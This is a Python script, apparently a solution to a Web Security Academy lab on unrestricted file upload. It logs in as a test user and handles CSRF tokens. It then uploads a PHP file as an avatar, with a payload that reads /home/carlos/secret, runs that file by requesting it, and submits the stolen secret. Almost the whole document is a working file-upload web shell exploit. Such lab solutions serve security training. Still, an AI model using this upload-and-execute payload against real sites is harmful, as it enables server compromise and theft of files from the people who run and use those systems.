import requests
from bs4 import BeautifulSoup

site = '0a6f00df041fd38e82dc9d2f007900c5.web-security-academy.net'
login_url = f'https://{site}/login'
account_url = f'https://{site}/my-account'
upload_url = f'https://{site}/my-account/avatar'
webshell_url = f'https://{site}/files/avatars/secret.php'
submit_url = f'https://{site}/submitSolution'

s = requests.Session()

# Step 1: Get CSRF token for login
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 2: Login
login_data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=login_data)

# Step 3: Go to my-account and get new CSRF
resp = s.get(account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 4: Upload malicious PHP file
php_payload = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
multipart_form_data = {
    'csrf': (None, csrf),
    'user': (None, 'wiener'),
    'avatar': ('secret.php', php_payload, 'application/x-php')
}
resp = s.post(upload_url, files=multipart_form_data)

# Step 5: Execute the uploaded PHP file to get the secret
resp = s.get(webshell_url)
secret = resp.text.strip()
print(f"Secret from Carlos's home: {secret}")

# Step 6: Submit the solution
solution_data = {
    'answer': secret
}
resp = s.post(submit_url, data=solution_data)

# Final status check
if "Congratulations" in resp.text:
    print("✅ Lab solved!")
else:
    print("❌ Something went wrong. Double check your steps.")

